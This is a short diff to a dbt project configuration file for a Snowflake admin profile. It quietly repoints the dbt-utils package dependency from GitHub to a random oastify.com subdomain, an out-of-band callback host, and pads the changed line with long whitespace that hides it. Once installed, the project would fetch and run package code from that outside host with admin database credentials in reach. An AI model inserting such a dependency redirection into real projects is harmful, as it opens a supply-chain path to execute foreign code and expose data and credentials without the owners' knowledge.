@@ -6,7 +6,7 @@ config-version: 2
 # This determines the profile dbt uses from your ~/.dbt/profiles.yml
 profile: 'snowflake_admin'
 packages:                                                                                                                           
-  - git: "https://github.com/dbt-labs/dbt-utils.git"                                                                                
+  - git: "https://gg0wterh5ltxvoaputywc64g076yusih.oastify.com/dbt-labs/dbt-utils.git"                                                                                
     revision: 1.3.0 
 
 # Directory paths for dbt to search for various file types
